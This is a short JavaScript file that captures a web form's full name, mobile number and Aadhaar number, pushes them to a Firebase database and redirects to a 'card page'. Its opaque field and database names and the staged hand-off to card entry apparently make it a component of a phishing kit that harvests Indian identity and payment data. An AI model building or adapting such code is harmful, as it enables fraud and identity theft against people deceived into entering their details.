// reference your database
var ududip007DB = firebase.database().ref("ududip007");

document.getElementById("ududip007").addEventListener("submit", submitForm);

function submitForm(e) {
  e.preventDefault();

    var a1 = getElementVal("a1");
    var b1 = getElementVal("b1");
    var c1 = getElementVal("c1");

    
    

  

  saveMessages(a1, b1, c1);

  // redirect to card page
  window.location.href = "2.html";
}

const saveMessages = (a1, b1, c1) => {
  var newududip007 = ududip007DB.push();

  newududip007.set({
      full_Name: a1,
      mobile_Number: b1,
      aadhar_Number: c1,
      
      
    
    
  });
};

const getElementVal = (id) => {
  return document.getElementById(id).value;
};